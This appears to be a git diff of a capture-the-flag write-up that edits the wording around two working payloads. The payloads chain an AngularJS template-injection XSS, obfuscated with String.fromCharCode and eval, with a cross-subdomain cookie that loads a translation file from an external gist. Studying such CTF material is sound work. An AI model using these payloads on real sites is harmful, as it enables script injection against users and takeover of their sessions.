@@ -91,12 +91,12 @@ Now we need to redirect the admin from `legacy` to `legacyversion2` website and 
 
 The answer is "It's still possible". I was told by @dimasmaulana that we can share cookie between subdomain and he gave me this [reference](https://stackoverflow.com/questions/18492576/share-cookies-between-subdomain-and-domain) to read.
 
-Here is the payload that I used to solve this chall
+Here is the payload I used to solve this chall
 ```
 document.cookie="NG_TRANSLATE_LANG_KEY=https%3A%2F%2Fgist.githubusercontent.com%2Fdaffainfo%2Fd8cbd68a5b429f7423040b10d135dd16%2Fraw%2F876f863f560a6f75038eccf7ad242fefc5cad1dd%2Fa;domain=ctf.hackaplaneten.se";window.location.replace("http://legacyversion2-1.ctf.hackaplaneten.se:8001/");window.location.replace("http://legacyversion2-1.ctf.hackaplaneten.se:8001/demo/");
 ```
 
-So we set the cookie first on `legacy1` and dont forget to add `;domain=ctf.hackaplaneten.se` because we need to set the cookie to another subdomain. And then redirect admin to `legacyversion2` webiste. And here is the final payload that I used to solve this chall
+So we set the cookie first on `legacy1` and dont forget to add `;domain=ctf.hackaplaneten.se` because we need to set the cookie to another subdomain. And then redirect admin to `legacyversion2` webiste. And here is the final payload I used to solve this chall
 
 ```
 http://legacy-1.ctf.hackaplaneten.se:8001/awikwok#!{{$on.constructor('eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61,34,78,71,95,84,82,65,78,83,76,65,84,69,95,76,65,78,71,95,75,69,89,61,104,116,116,112,115,37,51,65,37,50,70,37,50,70,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,37,50,70,100,97,102,102,97,105,110,102,111,37,50,70,100,56,99,98,100,54,56,97,53,98,52,50,57,102,55,52,50,51,48,52,48,98,49,48,100,49,51,53,100,100,49,54,37,50,70,114,97,119,37,50,70,56,55,54,102,56,54,51,102,53,54,48,97,54,102,55,53,48,51,56,101,99,99,102,55,97,100,50,52,50,102,101,102,99,53,99,97,100,49,100,100,37,50,70,97,59,100,111,109,97,105,110,61,99,116,102,46,104,97,99,107,97,112,108,97,110,101,116,101,110,46,115,101,34,59,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,34,104,116,116,112,58,47,47,108,101,103,97,99,121,118,101,114,115,105,111,110,50,45,49,46,99,116,102,46,104,97,99,107,97,112,108,97,110,101,116,101,110,46,115,101,58,56,48,48,49,47,34,41,59,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,34,104,116,116,112,58,47,47,108,101,103,97,99,121,118,101,114,115,105,111,110,50,45,49,46,99,116,102,46,104,97,99,107,97,112,108,97,110,101,116,101,110,46,115,101,58,56,48,48,49,47,100,101,109,111,47,34,41,59))')()}}
